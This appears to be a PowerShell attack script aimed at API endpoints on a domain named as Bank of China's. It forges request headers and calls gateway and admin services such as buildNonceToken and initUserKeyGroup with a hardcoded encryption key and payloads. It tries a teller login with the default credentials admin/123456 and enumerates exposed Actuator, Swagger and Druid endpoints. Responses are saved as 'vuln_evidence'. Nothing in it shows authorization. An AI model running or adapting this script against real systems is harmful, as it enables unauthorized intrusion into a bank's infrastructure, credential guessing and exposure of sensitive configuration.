$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "Continue"

$baseUrl = "https://dl.brcloud.bankofchina.com/dlydjd"
$outDir = "e:\BaiduNetdiskDownload\1\vuln_evidence"
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }

# 标准请求头JSON字符串
$baseHeader = '{"CurrentPageNum":1,"PageTotalNum":10,"NoRetCode":true,"BranchId":"800000","LegalRepCode":"10000","TranTeller":"","TranDate":"20260716","TranTime":"004500000","ServiceCode":"D20190130","AuthFlag":"0","AuthrTellerNo":"1","Channel":"39","ConsumerId":"1","GlobalSeq":"1","GlobalSeqNo":"1","KeyId":"1","LocalLang":"1","Mac":"1","SourceSysId":"1111","TerminalCode":"1121","TranSeq":"1","TranSeqNo":"1","TranTellerNo":"1","ExtendContent":"1","TotalNum":"0"'

function Send-Test {
    param($path, $bodyJson, $desc)

    $fullUrl = "$baseUrl/$path"
    $tempFile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllText($tempFile, $bodyJson)

    $startTime = Get-Date
    $resp = (curl.exe -sk --noproxy "*" --max-time 20 -X POST $fullUrl `
        -H "Content-Type: application/json" `
        -H "Authorization: 987654321" `
        -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)" `
        --data-binary "@$tempFile" `
        -w "`nHTTP_CODE:%{http_code} TIME:%{time_total}s SIZE:%{size_download}" 2>&1) -join "`n"
    $duration = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 2)
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

    $retCode = ""
    $retMsg = ""
    if ($resp -match '"RetCode":"([^"]*)"') { $retCode = $Matches[1] }
    if ($resp -match '"RetMsg":"([^"]*)"') { $retMsg = $Matches[1] }
    $httpCode = ""
    if ($resp -match "HTTP_CODE:(\d+)") { $httpCode = $Matches[1] }

    Write-Host "[$desc] => HTTP:$httpCode RetCode=$retCode RetMsg=$retMsg | ${duration}s | Size=$($resp.Length)" -ForegroundColor Cyan

    if ($retCode -eq "000000") {
        Write-Host "  >>> SUCCESS!" -ForegroundColor Green
        $preview = if ($resp.Length -gt 1000) { $resp.Substring(0, 1000) + "..." } else { $resp }
        Write-Host "  $preview" -ForegroundColor Yellow
        $safeName = ($desc) -replace "[/\\ :]", "_"
        $resp | Out-File -FilePath (Join-Path $outDir "enc_$safeName.json") -Encoding utf8
    } elseif ($httpCode -ne "404" -and $httpCode -ne "000" -and $httpCode -ne "" -and $resp.Length -gt 50) {
        $preview = if ($resp.Length -gt 500) { $resp.Substring(0, 500) } else { $resp }
        Write-Host "  $preview" -ForegroundColor DarkYellow
    }
    Write-Host ""
    Start-Sleep -Milliseconds 500
}

# ========== Part 1: isApiUseEncryptionList ==========
Write-Host "========== Part 1: isApiUseEncryptionList ==========" -ForegroundColor Magenta
$body1 = '{"Header":' + $baseHeader.Replace('"TranTeller":"",', '"TranTeller":"","TranCode":"CUST-INFO/isApiUseEncryptionList","ServiceName":"isApiUseEncryptionList",') + '}'
Send-Test "gateway/admin/isApiUseEncryptionList" $body1 "isApiUseEncryptionList-gw"
Send-Test "sgp/isApiUseEncryptionList" $body1 "isApiUseEncryptionList-sgp"
Send-Test "sgp/transferRequest" $body1 "isApiUseEncryptionList-sgpTransfer"

# ========== Part 2: buildNonceToken ==========
Write-Host "========== Part 2: buildNonceToken (K_E加密) ==========" -ForegroundColor Magenta
Write-Host "  K_E = 714b674e6c796245574d48652b39773d"
$encData = "0b8fc240bdde11595fd2ac851725c41c"
Write-Host "  明文=5859_7865 SM4加密=$encData"
$body2 = '{"Header":' + $baseHeader.Replace('"TranTeller":"",', '"TranTeller":"","TranCode":"CUST-INFO/buildNonceToken","ServiceName":"buildNonceToken",') + ',"data":"' + $encData + '"}'
Send-Test "gateway/admin/buildNonceToken" $body2 "buildNonceToken-gw"
Send-Test "sgp/buildNonceToken" $body2 "buildNonceToken-sgp"
Send-Test "sgp/transferRequest" $body2 "buildNonceToken-sgpTransfer"

# ========== Part 3: initUserKeyGroup ==========
Write-Host "========== Part 3: initUserKeyGroup (DH密钥协商) ==========" -ForegroundColor Magenta
$modeType = "cd9775a1436707f93d76734bc86fe27f"
$appId = "9e2b1678ffa9d0834b9ebebc998c17caa16cf7db987f555ccd8a0bef0d5f6e0a"
$openId = "ada68271fdce1c90cd6ab684bcbf1fb0b17a4d044abe9b56bec5f8e9089f8dc0"
$body3 = '{"Header":' + $baseHeader.Replace('"TranTeller":"",', '"TranTeller":"","TranCode":"CUST-INFO/initUserKeyGroup","ServiceName":"initUserKeyGroup",') + ',"negotiateValue":"","modeType":"' + $modeType + '","appId":"' + $appId + '","openId":"' + $openId + '"}'
Send-Test "gateway/admin/initUserKeyGroup" $body3 "initUserKeyGroup-gw"
Send-Test "sgp/initUserKeyGroup" $body3 "initUserKeyGroup-sgp"
Send-Test "sgp/transferRequest" $body3 "initUserKeyGroup-sgpTransfer"

# ========== Part 4: sgpTellerLogin ==========
Write-Host "========== Part 4: sgpTellerLogin.auth ==========" -ForegroundColor Magenta
$body4 = '{"Header":' + $baseHeader.Replace('"TranTeller":"",', '"TranTeller":"","TranCode":"test-Login","ServiceName":"sgpTellerLogin",') + '}'
Send-Test "sgp/sgpTellerLogin.auth" $body4 "sgpTellerLogin-empty"
$body4b = '{"Header":' + $baseHeader.Replace('"TranTeller":"",', '"TranTeller":"","TranCode":"test-Login","ServiceName":"sgpTellerLogin",') + ',"tellerId":"admin","password":"123456","deviceId":"test"}'
Send-Test "sgp/sgpTellerLogin.auth" $body4b "sgpTellerLogin-creds"

# ========== Part 5: sgpTellerLogout ==========
Write-Host "========== Part 5: sgpTellerLogout ==========" -ForegroundColor Magenta
$body5 = '{"Header":' + $baseHeader.Replace('"TranTeller":"",', '"TranTeller":"","TranCode":"test-Logout","ServiceName":"sgpTellerLogout",') + '}'
Send-Test "sgp/sgpTellerLogout.auth" $body5 "sgpTellerLogout"

# ========== Part 6: queryVerificationCode ==========
Write-Host "========== Part 6: queryVerificationCode ==========" -ForegroundColor Magenta
$body6 = '{"Header":' + $baseHeader.Replace('"TranTeller":"",', '"TranTeller":"","TranCode":"test-queryVerificationCode","ServiceName":"queryVerificationCode",') + '}'
Send-Test "sgp/queryVerificationCode.auth" $body6 "queryVerificationCode"

# ========== Part 7: Actuator端点 ==========
Write-Host "========== Part 7: Actuator/Swagger端点 ==========" -ForegroundColor Magenta
$paths = @(
    "actuator", "actuator/health", "actuator/env", "actuator/beans",
    "actuator/mappings", "actuator/configprops", "actuator/info",
    "swagger-ui.html", "v2/api-docs", "swagger-resources",
    "druid/", "druid/index.html",
    "gateway/actuator", "gateway/actuator/health",
    "sgp/actuator", "sgp/actuator/health",
    "gateway/admin/", "admin/", "admin/login"
)
foreach ($p in $paths) {
    $u = "$baseUrl/$p"
    $r = (curl.exe -sk --noproxy "*" --max-time 8 -X GET $u -H "Authorization: 987654321" -w "`nHTTP_CODE:%{http_code} SIZE:%{size_download}" 2>&1) -join "`n"
    $hc = ""; if ($r -match "HTTP_CODE:(\d+)") { $hc = $Matches[1] }
    $sz = ""; if ($r -match "SIZE:(\d+)") { $sz = $Matches[1] }
    if ($hc -eq "200" -and [int]$sz -gt 10) {
        Write-Host "  [FOUND] /$p => HTTP 200 | Size: $sz" -ForegroundColor Green
        $pv = if ($r.Length -gt 500) { $r.Substring(0, 500) } else { $r }
        Write-Host "  $pv" -ForegroundColor Yellow
    } elseif ($hc -ne "404" -and $hc -ne "000" -and $hc -ne "") {
        Write-Host "  [HTTP $hc] /$p Size:$sz" -ForegroundColor DarkYellow
    }
    Start-Sleep -Milliseconds 200
}

Write-Host "`n========== Done ==========" -ForegroundColor Magenta
